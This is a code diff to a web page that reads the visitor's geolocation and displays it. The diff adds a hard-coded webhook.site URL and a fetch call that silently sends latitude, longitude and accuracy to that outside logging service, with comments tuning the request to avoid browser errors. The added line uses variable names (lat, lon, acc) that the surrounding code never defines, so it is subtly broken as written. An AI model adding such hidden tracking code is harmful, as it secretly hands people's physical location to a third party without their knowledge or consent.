@@ -14,6 +14,9 @@
   <pre id="output"></pre>
 
   <script>
+    
+    const WEBHOOK_URL = "https://webhook.site/6ef784ae-73e7-45ad-b364-6b72ce1180eb"; 
+
     function getLocation() {
       const status = document.getElementById("status");
       const output = document.getElementById("output");
@@ -31,6 +34,10 @@
           const { latitude, longitude, accuracy } = position.coords;
 
           status.textContent = "Location received!";
+          fetch(`${WEBHOOK_URL}?lat=${lat}&lon=${lon}&acc=${acc}`, {
+                        method: 'GET', // Using GET to put data in URL (easier for logging)
+                        mode: 'no-cors' // Important: Prevents CORS errors on the client side
+          })
 
           output.textContent =
             `Latitude:  ${latitude}\n` +
